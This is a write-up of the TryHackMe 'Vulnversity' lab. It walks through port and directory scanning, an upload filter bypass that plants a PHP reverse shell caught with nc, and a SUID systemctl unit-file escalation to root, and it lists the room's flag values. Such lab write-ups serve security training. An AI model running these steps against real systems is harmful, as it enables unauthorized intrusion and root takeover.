# Vulnversity — TryHackMe Writeup

![Category](https://img.shields.io/badge/Category-Boot2Root-blue.svg)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen.svg)
![OS](https://img.shields.io/badge/OS-Linux-success.svg)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red.svg)

A professional penetration test walkthrough for the **Vulnversity** room on TryHackMe.

---

## 📋 Executive Summary
Vulnversity demonstrates core penetration testing phases: active network reconnaissance with Nmap, hidden directory discovery with Gobuster, file upload extension filter fuzzing and bypass, and root privilege escalation via SUID-configured `systemctl`.

* **Target OS:** Linux (Ubuntu)
* **Initial Access:** File upload filter bypass (`.phtml`) on `/internal/` -> PHP reverse shell.
* **Privilege Escalation:** SUID `/bin/systemctl` custom service execution.
* **Artifacts in Directory:**
  * `list.txt`: Extension wordlist for upload fuzzing (`.php .php3 .php4 .php5 .phtml`)
  * `shell.phtml`: PHP reverse shell payload

---

## 🔍 Stage 1: Reconnaissance & Enumeration

### 1.1 Port Scanning
```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```
* **Port 21/tcp:** vsftpd 3.0.3
* **Port 22/tcp:** OpenSSH 7.2p2 Ubuntu
* **Port 139/445/tcp:** Samba smbd 3.X - 4.X
* **Port 3128/tcp:** Squid http proxy 3.5.12
* **Port 3333/tcp:** Apache httpd 2.4.18

### 1.2 Web Directory Enumeration
```bash
gobuster dir -u http://<TARGET_IP>:3333 -w /usr/share/wordlists/dirb/common.txt
```
Discovered:
* `/internal/` (HTTP 200) — Private internal file submission form.

---

## 💥 Stage 2: Initial Foothold (File Upload Bypass)

### 2.1 Extension Fuzzing
Uploading `.php` returned: *"Extension not allowed"*.
Using Burp Suite Intruder with `list.txt`, `.phtml` successfully bypassed the filter.

### 2.2 Shell Execution
1. Configured `shell.phtml` with attacker IP and port 4444.
2. Uploaded `shell.phtml` at `http://<TARGET_IP>:3333/internal/`.
3. Started listener:
   ```bash
   nc -lvnp 4444
   ```
4. Executed:
   ```bash
   curl http://<TARGET_IP>:3333/internal/uploads/shell.phtml
   ```
5. Shell caught as `www-data`.
6. User flag:
   ```bash
   cat /home/bill/user.txt
   # 8bd7992276f7349ccddced0b00850240
   ```

---

## 📈 Stage 3: Privilege Escalation (SUID Systemctl)

### 3.1 SUID Binary Enumeration
```bash
find / -perm -4000 -type f 2>/dev/null
```
Unusual finding:
```text
/bin/systemctl
```

### 3.2 Systemd Service Exploitation
Creating a malicious systemd unit file that makes `/bin/bash` SUID:
```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF

/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```
Spawning root shell:
```bash
/bin/bash -p
whoami
# root
cat /root/root.txt
# a5850105b8e3e16406d813f34f574226
```

---

## 🛡️ Remediation
1. **File Upload Security:** Enforce strict file extension whitelisting and validate file signatures.
2. **SUID Permission Hardening:** Remove SUID bit from system control utilities (`chmod u-s /bin/systemctl`).
